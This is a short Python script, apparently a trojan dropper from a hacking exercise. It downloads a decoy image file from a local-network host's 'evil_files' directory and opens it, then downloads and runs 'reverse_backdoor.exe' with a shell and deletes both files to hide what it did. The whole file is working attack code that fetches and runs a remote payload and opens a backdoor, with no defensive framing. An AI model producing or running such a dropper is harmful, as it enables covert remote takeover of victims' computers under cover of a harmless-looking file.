import requests
import subprocess
import smtplib
import ssl
import tempfile
import os
from email.mime.text import MIMEText


def download(url, file_location):
    response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(f'{file_location}{file_name}', 'wb') as f:
        f.write(response.content)


if __name__ == '__main__':
    evil_location = 'z:/'
    # evil_location = tempfile.gettempdir()
    os.chdir(evil_location)

    evil_file = 'image.jpg'

    download(f'http://192.168.1.124/evil_files/{evil_file}', evil_location)
    subprocess.Popen(evil_file,shell=True)

    download(f'http://192.168.1.124/evil_files/reverse_backdoor.exe', evil_location)
    subprocess.call('reverse_backdoor.exe',shell=True)

    os.remove(evil_file)
    os.remove('reverse_backdoor.exe')

   